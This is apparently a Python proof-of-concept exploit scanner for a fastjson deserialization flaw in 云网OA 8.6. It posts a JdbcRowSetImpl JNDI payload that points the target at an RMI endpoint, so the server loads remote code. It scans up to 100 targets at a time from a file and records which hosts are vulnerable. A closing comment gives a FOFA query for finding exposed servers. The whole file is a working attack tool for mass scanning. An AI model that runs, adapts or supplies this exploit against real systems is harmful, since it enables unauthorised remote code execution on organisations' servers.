import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """云网OA8.6存在fastjson反序列化漏洞"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='云网OA8.6存在fastjson反序列化漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/oa/setup/updateUiSetup"
    headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/120.0.0.0Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip,deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "skincode=lte;name=admin;pwd=;JSESSIONID=85F37A117572BE90EA4BA0ED10F77EF5",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "196",
    }
    data = 'uiSetup={"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl" }, "b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1389/Exploit", "autoCommit":true}}'
    try:
        response = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        if response.status_code == 200 and "code" in response.text:
            print(f"[+]{target}存在反序列化漏洞")
            with open('云网_result.txt','a',encoding='utf-8') as f:
                f.write(f"{target}存在反序列化漏洞\n")
        else:
            print(f"[-]{target}不存在反序列化漏洞")
    except:
        print(f"[x]{target}可能存在反序列化漏洞请手工测试")
if __name__ == '__main__':
    main()

#fofa
# "云网OA"